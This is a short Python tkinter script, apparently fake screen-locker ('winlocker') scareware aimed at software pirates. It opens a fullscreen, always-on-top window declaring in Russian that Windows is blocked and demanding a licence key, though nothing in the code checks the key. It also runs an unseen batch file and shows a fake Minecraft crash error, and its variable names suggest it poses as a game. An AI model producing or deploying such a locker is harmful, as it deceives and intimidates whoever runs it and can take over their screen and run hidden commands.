from tkinter import*
from tkinter.messagebox import *
import os



game = Tk()
game.attributes('-fullscreen', True)
game.attributes('-topmost', -1)
game.resizable(height=0, width=0)
canvas=Canvas(game, background='blue', height=2000, width=3500)
canvas.pack()

gametxt = Label(game, text='Ну что, мамкин пират, доигрался?', bg='blue', fg='white', font=('Arial', 12))
gametxt2 = Label(game, text='Вводи действительный ключ лицензии, чтобы разблокировать комп', bg='blue', fg='white', font=('Arial', 12))
gametxt.place(x=660, y=300)
gametxt2.place(x=560, y=320)

windowsblocked = Label(game, text='Windows заблокирован!', fg='red', bg='black', font=('Arial', 25))
windowsblocked.place(x=600, y=100)

codefield = Entry(game)
codefield.place(x=710, y=280)

os.system('audio.mp3')
os.system('game_properties.bat')

showerror(title='Неизвестная ошибка', message='Майнкрафт не запустился по неизвестной причине, перезагрузите компьютер')

game.mainloop()